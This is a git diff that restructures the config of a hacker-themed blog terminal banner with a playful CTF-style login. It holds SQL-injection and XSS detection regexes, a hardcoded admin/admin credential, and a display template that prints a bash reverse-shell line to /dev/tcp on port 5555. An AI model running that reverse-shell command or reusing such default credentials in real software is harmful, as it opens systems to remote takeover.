@@ -1,44 +1,48 @@
-export const CONFIG = Object.freeze({
+export const BASE = Object.freeze({
     hook: 'terminal-banner',
     terminalTitle: 'Blog Security',
     subtitle: 'Hack Logon',
     additional: '',
     github: 'https://github.com/Erzbir/jsnix',
-    loadSpinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
-    loadResult: '✓',
-    buttonText: 'OK',
+});
+
+export const SECURITY = Object.freeze({
     credential: {
         username: 'admin',
         password: 'admin'
     },
+    maxLoginAttempts: 5,
+    maxInputLength: 16,
+    triggerKey: 'Control',
+    keySequenceLength: 5,
+    sqlPattern: /(\b(SELECT|UPDATE|DELETE|INSERT|UNION|DROP|CREATE|ALTER|EXEC|TRUNCATE|INTO|DECLARE|FROM)\b\s.*)|('.*--)|(\bOR\b\s+\S+\s*=\s*\S+)|(\bAND\b\s+\S+\s*=\s*\S+)|(\bOR\b\s+\d+\s*=\s*\d+)|(\bAND\b\s+\d+\s*=\s*\d+)|(--\s*$)|(\/\*.*\*\/)|(\b(CONCAT|CHAR|ASCII|HEX)\b\s*\()|(\bUNION\s+ALL\s+SELECT\b)/i,
+    xssPattern: /['"<>]|<[^>]*>|javascript:|onerror=|onload=|eval\(|setTimeout\(|setInterval\(|\balert\b|\bprompt\b|\bconfirm\b|document\.cookie|document\.write/i
+});
+
+export const STYLES = Object.freeze({
+    loadSpinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
+    loadResult: '✓',
+    buttonText: 'OK',
     typing: {
         minSpeed: 5,
         maxSpeed: 7,
     },
-    security: {
-        maxLoginAttempts: 5,
-        maxInputLength: 16,
-        triggerKey: 'Control',
-        keySequenceLength: 5,
-        sqlPattern: /(\b(SELECT|UPDATE|DELETE|INSERT|UNION|DROP|CREATE|ALTER|EXEC|TRUNCATE|INTO|DECLARE|FROM)\b\s.*)|('.*--)|(\bOR\b\s+\S+\s*=\s*\S+)|(\bAND\b\s+\S+\s*=\s*\S+)|(\bOR\b\s+\d+\s*=\s*\d+)|(\bAND\b\s+\d+\s*=\s*\d+)|(--\s*$)|(\/\*.*\*\/)|(\b(CONCAT|CHAR|ASCII|HEX)\b\s*\()|(\bUNION\s+ALL\s+SELECT\b)/i,
-        xssPattern: /['"<>]|<[^>]*>|javascript:|onerror=|onload=|eval\(|setTimeout\(|setInterval\(|\balert\b|\bprompt\b|\bconfirm\b|document\.cookie|document\.write/i
-    },
-    styles: {
-        terminalColor: 'inherit',
-        printColor: '#d5d7d8',
-        inputColor: '#98c379',
-        outputColor: '#61afef',
-        warnColor: '#efc261',
-        errorColor: '#ef6161',
-        backgroundColor: 'inherit',
-        promptColor: '#98c379',
-        textFontSize: 'inherit',
-        textFontFamily: 'inherit'
-    },
-    templates: {
-        prompt: '{{USER}}:{{PATH}}$ ',
-        sysInfo: 'Blog Security Interface Version 3.0.0 from https://github.com/Erzbir/jsnix',
-        envCheck: `[+] Initializing Security Grid...
+    terminalColor: 'inherit',
+    printColor: '#d5d7d8',
+    inputColor: '#98c379',
+    outputColor: '#61afef',
+    warnColor: '#efc261',
+    errorColor: '#ef6161',
+    backgroundColor: 'inherit',
+    promptColor: '#98c379',
+    textFontSize: 'inherit',
+    textFontFamily: 'inherit'
+});
+
+export const TEMPLATES = Object.freeze({
+    prompt: '{{USER}}:{{PATH}}$ ',
+    sysInfo: `Blog Security Interface Version 3.0.0 from ${BASE.github}`,
+    envCheck: `[+] Initializing Security Grid...
 [{{LOADING}}] OS Integrity
 [{{LOADING}}] Kernel Module
 [{{LOADING}}] Access Control
@@ -48,18 +52,18 @@ export const CONFIG = Object.freeze({
 [{{LOADING}}] Security Policy Loader
 [{{LOADING}}] System check completed. No critical issues detected.
 [+] Monitoring activated...\n`,
-        accessDenied: `> access {{USER}}
+    accessDenied: `> access {{USER}}
 Verifying credentials...
 access: PERMISSION DENIED.`,
-        accessSuccess: `> access {{USER}}
+    accessSuccess: `> access {{USER}}
 Verifying credentials...
 access: SUCCESS
 Is the flag here?
 Erzbir Blog System 3.0.0 #1 SMP PREEMPT_DYNAMIC Sat May 10 15:30:58 CST 2025 x86_64
 Last login: {{LAST_LOGIN_TIME}} from {{LOCAL_IP}}`,
-        hackerAlert: '**ALERT: Hacker detected!**',
-        attackAlert: '**ALERT: Illegal content, hacker detected!**',
-        hacked: `> scan {{IP_ADDRESS}}
+    hackerAlert: '**ALERT: Hacker detected!**',
+    attackAlert: '**ALERT: Illegal content, hacker detected!**',
+    hacked: `> scan {{IP_ADDRESS}}
 [INFO] Scanning target {{IP_ADDRESS}} for open ports...
 [INFO] Open ports detected: 80 (HTTP), 443 (HTTPS)
 
@@ -94,5 +98,4 @@ www-data:*:19360:0:99999:7:::
 nobody:*:19360:0:99999:7:::
 > /bin/bash -c '/bin/bash -i >& /dev/tcp/{{LOCAL_IP}}/5555 0>&1'
 `,
-    }
 });
